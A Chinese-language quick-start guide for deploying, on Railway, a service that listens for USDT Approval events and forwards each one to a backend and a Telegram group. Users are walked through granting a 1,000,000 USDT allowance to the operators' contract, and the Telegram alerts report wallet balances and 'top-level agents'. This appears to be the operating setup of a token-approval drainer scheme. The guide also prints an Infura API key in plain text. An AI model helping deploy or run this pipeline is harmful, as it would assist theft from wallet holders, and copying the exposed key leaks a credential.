# ⚡ Railway 部署 - 快速开始（5 分钟）

## ✅ 前提条件

- [x] 本地测试成功
- [x] Infura API Key 已配置
- [x] 代码已准备好

---

## 🚀 快速部署步骤

### 步骤 1：提交代码到 GitHub（2 分钟）

```bash
# 返回项目根目录
cd ..

# 添加所有文件
git add approval-monitor ceshi

# 提交
git commit -m "✅ Infura WebSocket 监听服务已配置并测试成功"

# 推送到 GitHub
git push
```

---

### 步骤 2：部署到 Railway（3 分钟）

#### 2.1 注册 Railway

访问：https://railway.app/

用 **GitHub 账号**登录（最快）

#### 2.2 创建新项目

点击 **"New Project"**

选择 **"Deploy from GitHub repo"**

#### 2.3 授权 GitHub（如果是第一次）

1. 点击 **"Configure GitHub App"**
2. 选择仓库访问权限
3. 授权

#### 2.4 选择仓库

选择您的仓库（eth 或 newdapp-master）

Railway 会自动：
- ✅ 检测到 `package.json`
- ✅ 检测到 `Procfile`
- ✅ 开始构建

#### 2.5 配置环境变量（重要！）

**等待首次构建完成**（约 1-2 分钟）

然后：

1. 点击项目 → 点击服务
2. 点击 **"Variables"** 标签
3. 点击 **"+ New Variable"**

**添加两个变量**：

```
Variable 1:
Name:  INFURA_API_KEY
Value: 1ee77a16f5f34cc099549ff3b116ccba

Variable 2:
Name:  API_ENDPOINT
Value: https://ethmax.vercel.app
```

#### 2.6 等待重新部署

添加环境变量后，Railway 会自动重新部署（约 1 分钟）

---

### 步骤 3：验证部署（1 分钟）

#### 3.1 查看日志

点击 **"Deployments"** → 选择最新部署 → **"View Logs"**

**预期日志**：

```
🚀 启动 USDT Approval 监听服务 (Infura)...
✅ Infura WebSocket Provider 初始化成功
🎯 USDT Approval 事件监听服务 (Infura 版本)
🎧 开始监听 Approval 事件...
✅ Approval 监听服务已启动 (Infura WebSocket)
✅ 服务启动完成！
```

✅ **看到这些日志，说明部署成功！**

#### 3.2 等待健康检查

**1 分钟后**，日志会显示：

```
────────────────────────────────────────────────────────────
💓 健康检查 (Infura WebSocket)
────────────────────────────────────────────────────────────
⏰ 运行时间: 0时1分0秒
🔄 重连次数: 0
📊 总计事件: 0
✅ 处理成功: 0
❌ 处理失败: 0
🕐 最后事件: 无
📅 当前时间: 2025-10-12 18:45:00
────────────────────────────────────────────────────────────
```

✅ **说明服务运行正常！**

---

## 🧪 完整测试

### 测试 1：触发真实授权（5 分钟）

#### 1.1 用户端操作

1. 访问 https://ethmax.vercel.app
2. 连接 Trust Wallet 或 MetaMask
3. 点击授权按钮
4. 在钱包中确认授权

#### 1.2 观察 Railway 日志（15 秒内）

**预期日志**：

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔔 收到 Approval 事件!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 事件详情:
   👤 授权者: 0x9EbD7aFa96725B835e3B0B05f83AF7C2B98A3997
   🎯 被授权者: 0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218
   💰 授权额度: 1000000 USDT
   🔗 交易哈希: 0xabc123...

✅ 验证通过：用户授权给我们的合约!

🔄 开始处理授权...
📡 调用后端 API: https://ethmax.vercel.app/api/user/authorize
✅ 后端处理成功!
   📝 用户 ID: ec786873-f7b4-476c-91e7-de497b6457de
   🎁 奖励已发放
   📡 已添加到交易监听

🎉 授权处理完成!
```

#### 1.3 检查 Telegram 群组

应收到授权成功通知：

```
钱包余额: XXX
顶层代理: XXX
用户编号: 12345678
用户备注: XXX
...
[添加到链上实时监听] 按钮
```

#### 1.4 检查 Vercel 日志

访问 Vercel Dashboard → Logs

搜索：`/api/user/authorize`

**预期日志**：
```
POST /api/user/authorize 200
source: approval_monitor_infura
wallet_address: 0x9EbD...997
✅ 处理成功
```

✅ **如果三处都正常，说明整个流程成功！**

---

## 📊 监控

### Railway Dashboard

访问：https://railway.app/project/你的项目

**查看**：
- **Deployments**：部署历史和状态
- **Metrics**：CPU、内存、网络使用
- **Logs**：实时日志

### 健康检查（每分钟自动输出）

**正常状态**：
```
💓 健康检查 (Infura WebSocket)
⏰ 运行时间: 5时30分15秒
🔄 重连次数: 0
📊 总计事件: 25
✅ 处理成功: 24
❌ 处理失败: 1
```

**异常状态**（需要关注）：
- ❌ 重连次数 > 5（WebSocket 不稳定）
- ❌ 处理失败数量突然增加
- ❌ 运行时间重置（服务重启了）

---

## 💰 成本分析

### Railway 免费版限制

| 指标 | 免费额度 | 够用吗 |
|------|----------|--------|
| **执行时间** | 500 小时/月 | ❌ 不够（需 720 小时/月） |
| **内存** | 512 MB | ✅ 够用（< 100 MB） |
| **CPU** | 共享 | ✅ 够用（< 5%） |

**解决方案**：
- ✅ 升级到 **Hobby 计划**（$5/月，无限时）
- ✅ 或使用 **Render.com 免费版**（750 小时/月，够用）

### Infura 免费版

| 指标 | 免费额度 | 够用吗 |
|------|----------|--------|
| **请求数** | 10 万/天 | ✅ 完全够用 |
| **WebSocket** | 支持 | ✅ 完全够用 |

**结论**：
- Railway: $0（前 20 天）或 $5/月
- Infura: $0
- **总计**: $0-5/月

---

## ⚠️ 故障排查

### 问题 1：服务无法启动

**症状**：
- 日志显示错误
- 服务一直重启

**检查**：
1. 环境变量是否正确配置
2. Infura API Key 是否有效
3. Railway 日志中的具体错误

**解决**：
```bash
# 查看日志
railway logs

# 重新部署
railway up
```

### 问题 2：未收到 Approval 事件

**检查**：
1. Railway 服务是否运行中
2. Infura WebSocket 是否连接
3. 重连次数是否异常

**测试**：
触发一次真实授权，观察日志

### 问题 3：后端 API 调用失败

**症状**：
```
❌ 调用后端 API 失败: 500
```

**检查**：
1. Vercel 服务是否正常
2. API_ENDPOINT 是否正确
3. 后端日志是否有错误

**解决**：
```bash
# 测试 API
curl https://ethmax.vercel.app/api/user/authorize
```

---

## ✅ 部署完成检查清单

- [x] 代码已推送到 GitHub
- [x] Railway 项目已创建
- [x] 环境变量已配置（INFURA_API_KEY, API_ENDPOINT）
- [x] 服务已成功部署
- [x] 日志显示正常运行
- [x] 健康检查正常
- [x] 测试授权成功
- [x] Telegram 通知正常

---

## 🎉 恭喜！部署完成！

✅ **Approval 监听服务已成功部署到 Railway！**

**系统现在会自动**：
1. 24/7 监听用户授权
2. < 15 秒检测到授权
3. 自动处理所有逻辑
4. 自动发送 Telegram 通知

**完全自动化，无需任何手动操作！** 🚀

---

## 📞 需要帮助？

**文档**：
- 📖 完整指南：`ceshi/最优监听方案-完整版.md`
- 📖 Infura 配置：`ceshi/Infura替代方案-快速配置.md`
- 📖 代码说明：`approval-monitor/README.md`

**常见问题**：
- Railway 日志在哪？Dashboard → Deployments → View Logs
- 如何重新部署？Deployments → Redeploy
- 如何查看统计？查看健康检查日志

